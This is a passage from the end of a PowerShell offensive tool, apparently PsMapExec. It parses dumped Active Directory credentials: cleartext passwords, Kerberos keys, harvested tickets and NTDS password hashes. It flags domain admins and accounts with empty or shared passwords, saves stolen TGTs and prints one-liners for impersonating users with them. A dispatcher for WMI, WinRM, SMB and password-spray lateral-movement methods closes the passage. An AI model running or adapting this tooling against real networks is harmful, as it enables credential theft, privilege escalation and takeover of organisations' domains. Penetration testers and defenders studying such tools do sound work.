                if ($password -ne "(null)" -and $password -ne "(Hex Value: Redacted)" -and ($username -notmatch '\$$')) {
                    $notes += "[Cleartext Password] "
                }

                $isAdminGroupMember = $DomainAdmins -contains $username -or
                                    $EnterpriseAdmins -contains $username -or
                                    $ServerOperators -contains $username -or
                                    $AccountOperators -contains $username

                # Do not display the adminCount if a user is a member of the specified groups
                if (-not $isAdminGroupMember -and (AdminCount -UserName $username -Searcher $domainSearcher)) {
                    $notes += "[AdminCount=1] "
                }

                # Check for Empty Password hash
                if ($keyList -match "rc4_hmac_nt\s+31d6cfe0d16ae931b73c59d7e0c089c0") {
                    $notes += "[rc4_hmac_nt=Empty Password] "
                }

                # Checks for group memberships
                if ($DomainAdmins -contains $username) {
                    $notes += "[Domain Admin] "
                }
                if ($EnterpriseAdmins -contains $username) {
                    $notes += "[Enterprise Admin] "
                }
                if ($ServerOperators -contains $username) {
                    $notes += "[Server Operator] "
                }
                if ($AccountOperators -contains $username) {
                    $notes += "[Account Operator] "
                }

                $group = [PSCustomObject]@{
                    DomainUsername = $domainUsername
                    KeyList = $keyList | Where-Object { $_ -notmatch 'rc4_hmac_old|rc4_md4|rc4_hmac_nt_exp|rc4_hmac_old_exp|aes128_hmac' }
                    Password = $password
                    Notes = $notes
                }

                $uniqueGroups[$groupKey] = $group

                Write-Host "Username    : $domainUsername"
                if ($Password -eq "(null)" -or $Password -eq "" -or $Password -eq $null){} Else {Write-Host "Password    : $password"}

                foreach ($key in $group.KeyList) {
                    if (![string]::IsNullOrWhiteSpace($key)) {
                        $keyParts = $key.Trim() -split '\s+'
                        Write-Host "$($keyParts[0]) : $($keyParts[1])"
                    }
                }
                                if (-not [string]::IsNullOrWhiteSpace($notes)) {
                    Write-Host "Notes       : " -NoNewline
                    Write-Host $notes -ForegroundColor Yellow -NoNewline
                    Write-Host ""
                }

                Write-Host ""
            }
        }
    }

}



################################################################################################################
############################################## Function: Parse-KerbDump ########################################
################################################################################################################

function Parse-KerbDump {
    Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
    Start-sleep -Seconds "2"

    # Initialize DirectorySearcher
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher
    $Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domain")

    # Grab each candidate file for parsing based on the name ending in "KerbDump.txt"
    Get-ChildItem -Path $KerbDump -Filter "*KerbDump.txt" | 
        Where-Object { $_.Length -gt 0 } | 
        ForEach-Object {
            $Computer = $_.BaseName -split '-KerbDump' | Select-Object -First 1
            
            # Create the following flag to track output later
            $DisplayComputerName = $True

            # Create a directory in the name of the computer from which results are parsed from
            New-Item -ItemType "Directory" -Path $KerbDump -Name $Computer -Force | Out-Null
            $ComputerDirectory = "$KerbDump\$Computer"

            # Read the file content
            $FileContent = Get-Content -Path $_.FullName -Raw

            # Define regex pattern to match ticket details
            $pattern = "Service Name\s+:\s+(.+?)`r?`nEncryptionType\s+:\s+(.+?)`r?`nTicket Exp\s+:\s+(.+?)`r?`nServer Name\s+:\s+(.+?)`r?`nUserName\s+:\s+(.+?)`r?`nFlags\s+:\s+(.+?)`r?`nSession Key Type\s+:\s+(.+?)`r?`n"

            # Match and extract details
            $matches = [regex]::Matches($fileContent, $pattern)
            foreach ($match in $matches) {
                $data = @{
                    ServiceName     = $match.Groups[1].Value
                    EncryptionType  = $match.Groups[2].Value
                    TicketExp       = $match.Groups[3].Value
                    ServerName      = $match.Groups[4].Value
                    UserName        = $match.Groups[5].Value
                    Flags           = $match.Groups[6].Value
                    SessionKeyType  = $match.Groups[7].Value
                }

                # Transform the username into a more common format "DOMAIN\Username"
                $userNameParts = $data.UserName -split '@'
                $domainName = ($userNameParts[1] -split '\.')[0]  # Extracting domain name before the dot
                $DomainUserName = $userNameParts[0]

                # If the name contains $ then drop results from current loop. We do not want to see Computer account tickets in results
                if ($DomainUserName -match '\$$') { Continue }

                # Initialize notes variable
                $notes = ""

                # Track if the user is considered "Privileged". Used to help maintain tidy output by omitting some flags if present
                $PrivilegedUser = $false  

                if ($DomainUserName -in $DomainAdmins) { 
                    $notes += "[Domain Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $EnterpriseAdmins) { 
                    $notes += "[Enterprise Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $ServerOperators) { 
                    $notes += "[Server Operator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $AccountOperators) { 
                    $notes += "[Account Operator] " 
                    $PrivilegedUser = $true
                }

                # Check AdminCount only if the user is not already identified as $PrivilegedUser
                if (-not $PrivilegedUser -and (AdminCount -UserName $DomainUserName -Searcher $Searcher)) {
                    $notes += "[AdminCount=1] "
                }

                # if a KRBTGT service is contained within the field, add the tag [TGT] to the results
                if ($data.ServiceName -match "krbtgt/") {
                    $notes += "[TGT] "
                }

                # Only present results if the note field has been populated. This means interesting results have been identified.
                if ($notes -ne "") {
                    if ($DisplayComputerName) {
                        Write-Host "`n`n-[$Computer]-`n"
                        $DisplayComputerName = $false
                    }
                    
                    Write-Host "User Name     : $($domainName.ToLower())\$($DomainUserName)"
                    Write-Host "Service Name  : $($data.ServiceName.ToLower())"
                    if ($data.ServiceName -match "krbtgt/") {} Else {Write-Host "Server Name   : $($data.ServerName.ToLower())"}
                    Write-Host "Ticket Expiry : $($data.TicketExp)"
                    Write-Host -NoNewline "Notes         : "
                    Write-Host -ForegroundColor Yellow -NoNewline "$notes"
                    Write-Host

                    # Logic to help pull just the ticket string
                    $ticketPattern = "-\[Ticket\]-`r?`n`r?`n(.+?)(?:`r?`n|$)"
                    $ticketStartPos = $match.Index + $match.Length
                    $ticketSearchText = $fileContent.Substring($ticketStartPos)
                    if ($ticketSearchText -match $ticketPattern) {
                        $ticketString = $Matches[1]
                        
                        # Replace '\' with '_' in ServiceName, Windows will not accept "/" as part of a file name
                        $data.ServiceName = $data.ServiceName.Replace('/', '@')
                        
                        # Form a path and file name made up of the ticket properties
                        $filePath = "$ComputerDirectory\$($data.UserName)-$($data.ServiceName).txt"
                        $ticketString | Out-File -FilePath $filePath -NoNewline -Encoding "ASCII"
                        
                        # Assign a random variable name to each ticket path to help produce tidy output to console for command generation
                        if ($notes -match "TGT"){
                        do {
                            $randomVarName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
                        } while (Get-Variable -Name $randomVarName -ErrorAction SilentlyContinue -Scope Global)

                        Set-Variable -Name $randomVarName -Value $filePath -Scope Global
                        
                        # A neat one-liner instruction for the user
                        Write-Host "Impersonate   : PsMapExec -Targets All -Method WMI -Ticket `$$randomVarName"
                        Write-Host
                        
                        } Else {Write-Host}
                    }
                }
            }

             # Move and rename the file after processing
            $newFileName = ".$Computer.FullDump.txt"
            Move-Item -Path $_.FullName -Destination "$ComputerDirectory\$newFileName" -Force
        }

    Write-Host "`n`n[*] " -NoNewline -ForegroundColor "Yellow"
    Write-Host "Only interesting results have  been shown. Computer accounts are omitted"
    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
    Write-Host "Run with -NoParse to prevent parsing results in the future"
    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
    Write-Host "Each ticket has been stored in $KerbDump"
}

################################################################################################################
############################################## Function: Parse-NTDS ############################################
################################################################################################################

Function Parse-NTDS {
    param (
        [string]$DirectoryPath
    )

    if ([string]::IsNullOrEmpty($DirectoryPath)) {
        Write-Host "Directory path is not specified or is empty." -ForegroundColor Red
        return
    }

    if (-not (Test-Path -Path $DirectoryPath)) {
        Write-Host "Directory at path '$DirectoryPath' does not exist." -ForegroundColor Red
        return
    }

    $currentTime = Get-Date -Format "yyyyMMddHHmmss"
    Get-ChildItem -Path $DirectoryPath -Filter "*-NTDS.txt" -File | ForEach-Object {
        $NTDSFile = $_.FullName
        $computerName = [IO.Path]::GetFileNameWithoutExtension($_.Name) -replace "-NTDS", ""
        $newDirectoryName = "${computerName}-${currentTime}"
        $newDirectoryPath = Join-Path $DirectoryPath $newDirectoryName

        if (-not (Test-Path -Path $newDirectoryPath)) {
            New-Item -Path $newDirectoryPath -ItemType "Directory" | Out-Null
        }

        $userHashes = @()
        $computerHashes = @()
        $identicalPasswordGroups = @{}
        $emptyPasswordUsers = @()
        $samHashes = @()

        $prevLine = ""
        Get-Content $NTDSFile | ForEach-Object {
            $line = $_
            $parts = $line -split ':'
            $user = $parts[0]
            $hash = $parts[3]

            if ($hash -eq '31d6cfe0d16ae931b73c59d7e0c089c0') {
                $emptyPasswordUsers += $user
            }

            if ($user -like "*$*") {
                $computerHashes += $line
            } else {
                $userHashes += $line

                if ($hash -ne $null) {
                    if (-not $identicalPasswordGroups.ContainsKey($hash)) {
                        $identicalPasswordGroups[$hash] = @()
                    }
                    $identicalPasswordGroups[$hash] += $user
                }

                # Check if the previous line and the current line do not have two "::" in a row
                if (-not ($line -match ':::' -and $prevLine -match ':::')) {
                    $samHashes += $line
                }
            }

            $prevLine = $line
        }

        $userHashes | Set-Content -Path (Join-Path $newDirectoryPath "UserHashes.txt")
        $computerHashes | Set-Content -Path (Join-Path $newDirectoryPath "ComputerHashes.txt")
        $emptyPasswordUsers | Set-Content -Path (Join-Path $newDirectoryPath "UsersWithEmptyPasswords.txt")

        $groupNumber = 1
        $groupedUsersContent = foreach ($group in $identicalPasswordGroups.GetEnumerator()) {
            if ($group.Value.Count -gt 1) {
                $groupContent = "[Group $groupNumber]`n{0}" -f ($group.Value -join "`n")
                $groupNumber++
                $groupContent
                Write-Output ""
            }
        }

        $groupedUsersContent | Set-Content -Path (Join-Path $newDirectoryPath "GroupedUsersWithIdenticalPasswords.txt")

        $newFileName = ".$computerName-NTDS-Full.txt"
        Move-Item -Path $NTDSFile -Destination (Join-Path $newDirectoryPath $newFileName) -Force

        # Write SAM hashes to SAMHashes.txt
        $samHashes | Set-Content -Path (Join-Path $newDirectoryPath "SAMHashes.txt")
    }
}





################################################################################################################
################################################ Execute defined functions #####################################
################################################################################################################

switch ($Method) {
        "WinRM" {Method-WinRM}
        "MSSQL" {Method-MSSQL}
        "SMB" {Method-SMB}
        "WMI" {Method-WMIexec}
        "RDP" {Method-RDP}
        "GenRelayList" {GenRelayList}
        "SessionHunter" {Invoke-SessionHunter}
        "Spray" {Spray}
        "VNC" {Method-VNC}
        
        default {
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Invalid Method specified"
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Specify either WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
        return
      
      }
 }

if (!$NoParse){if ($Module -eq "SAM"){Parse-SAM}}
if (!$NoParse){if ($Module -eq "eKeys"){Parse-eKeys}}
if (!$NoParse){if ($Module -eq "LogonPasswords"){Parse-LogonPasswords}}
if (!$NoParse){if ($Module -eq "KerbDump"){Parse-KerbDump}}
if (!$NoParse){if ($Module -eq "NTDS"){Parse-NTDS -DirectoryPath $NTDS}}

RestoreTicket

Write-Host ""
$Time = (Get-Date).ToString("HH:mm:ss")
Write-Host "Script Completed : $Time"
$elapsedTime = (Get-Date) - $startTime

# Format the elapsed time
$elapsedHours = "{0:D2}" -f $elapsedTime.Hours
$elapsedMinutes = "{0:D2}" -f $elapsedTime.Minutes
$elapsedSeconds = "{0:D2}" -f $elapsedTime.Seconds
$elapsedMilliseconds = "{0:D4}" -f $elapsedTime.Milliseconds

# Display the formatted elapsed time
$elapsedTimeFormatted = "$elapsedHours h:$elapsedMinutes m:$elapsedSeconds s:$elapsedMilliseconds mi"
Write-Host "Elapsed Time     : $elapsedTime"

Get-Variable | Remove-Variable -ErrorAction SilentlyContinue
try {$searcher.Dispose()} Catch {}
$CurrentUser = $null

}
